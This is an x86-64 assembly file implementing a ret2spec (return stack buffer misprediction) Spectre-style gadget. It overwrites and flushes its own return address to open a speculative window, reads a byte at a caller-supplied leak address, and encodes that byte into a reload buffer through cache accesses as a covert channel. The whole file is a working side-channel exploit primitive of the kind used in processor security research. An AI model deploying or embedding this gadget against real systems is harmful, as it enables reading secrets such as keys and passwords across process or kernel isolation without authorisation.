.global ret2spec

.text

rsb_mispredict:
  movq $ret2spec_end, (%rsp)

  // Flush (%rsp) so noticing the wrong return
  // value will take a very long time, giving us
  // a long speculative window
  clflush (%rsp)
  mfence

  ret

// rdi: leak address
// rsi: reload buffer
ret2spec:
  pushq %rbp
  movq %rsp, %rbp

  xor %rax, %rax

  // This call actually modifies its return pointer to be at
  // ret2spec_end, so the instructions between the call and
  // the ret2spec_end label are never executed (except speculatively)
  call rsb_mispredict
  
  // Leak the value at (%rdi)
  movb (%rdi), %al

  // Covert channel for the leaked value
  // These two instructions are never actually executed, but are speculatively
  // executed. They have a side effect on the cache
  shl $0xc, %eax
  prefetcht0 (%rsi, %rax)
  mov (%rsi, %rax), %r8
  mfence

loop:
  pause
  jmp loop


ret2spec_end:
  movq %rbp, %rsp
  popq %rbp
  ret
  
